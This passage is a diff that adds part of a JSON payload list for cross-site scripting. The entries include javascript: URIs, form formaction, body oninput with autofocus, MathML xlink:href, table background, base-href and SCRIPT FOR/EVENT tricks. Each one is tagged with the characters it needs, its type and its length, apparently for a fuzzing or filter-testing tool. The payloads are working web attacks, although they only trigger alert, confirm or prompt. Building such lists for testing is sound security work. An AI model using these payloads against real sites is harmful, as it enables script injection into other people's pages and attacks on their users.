+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 23
+  },
+  {
+    "Payload": ";})javascript:confirm(0);",
+    "Attribute": [
+      ";",
+      "(",
+      ")"
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 25
+  },
+  {
+    "Payload": "javascript:confirm(0);",
+    "Attribute": [
+      ";",
+      "(",
+      ")"
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 22
+  },
+  {
+    "Payload": "javascript:confirm(1)//",
+    "Attribute": [
+      "/",
+      "(",
+      ")"
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 23
+  },
+  {
+    "Payload": "javascript:prompt(/XSS/.source);var x = prompt;x(0);x(/XSS/.source);x",
+    "Attribute": [
+      ")",
+      ";",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 69
+  },
+  {
+    "Payload": "\"javascript:prompt(/compaXSS/.source);var x = prompt;x(0);x(/XSS/.source);x\"",
+    "Attribute": [
+      "\"",
+      ")",
+      ";",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 76
+  },
+  {
+    "Payload": "/\"/_javascript:prompt(/xss/.source);var x = prompt;x(0);x(/XSS/.source);x",
+    "Attribute": [
+      "\"",
+      ")",
+      ";",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 73
+  },
+  {
+    "Payload": "<form><button formaction=\"javascript:javascript:alert(/AmoloHT/)\">X",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "<",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 67
+  },
+  {
+    "Payload": "<body oninput=javascript:alert(/AmoloHT/)><input autofocus>",
+    "Attribute": [
+      ">",
+      ")",
+      "<",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 59
+  },
+  {
+    "Payload": "<math href=\"javascript:javascript:alert(/AmoloHT/)\">CLICKME</math>  <math> <maction actiontype=\"statusline#http://google.com\" xlink:href=\"javascript:javascript:alert(/AmoloHT/)\">CLICKME</maction> </math>",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "<",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 203
+  },
+  {
+    "Payload": "<table background=\"javascript:javascript:alert(/AmoloHT/)\">",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "<",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 59
+  },
+  {
+    "Payload": "<head><base href=\"javascript://\"></head><body><a href=\"/. /,javascript:alert(/AmoloHT/)//#\">XXX</a></body>",
+    "Attribute": [
+      "\"",
+      ">",
+      ")",
+      "<",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 106
+  },
+  {
+    "Payload": "<SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(/AmoloHT/)</SCRIPT>",
+    "Attribute": [
+      ">",
+      ")",
+      "<",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "tag_based",
+    "encoding": "none",
+    "length": 82
+  },
+  {
+    "Payload": "'href=javascript:alert()>click me<a/y='",
+    "Attribute": [
+      ">",
+      ")",
+      "'",
+      "<",
+      "/",
+      "(",
+      "="
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 39
+  },
+  {
+    "Payload": "javaScRipt:Alert(‘1’)",
+    "Attribute": [
+      "(",
+      ")"
+    ],
+    "count": 0,
+    "waf": null,
+    "type": "javascript_protocol",
+    "encoding": "none",
+    "length": 21
+  }
+]
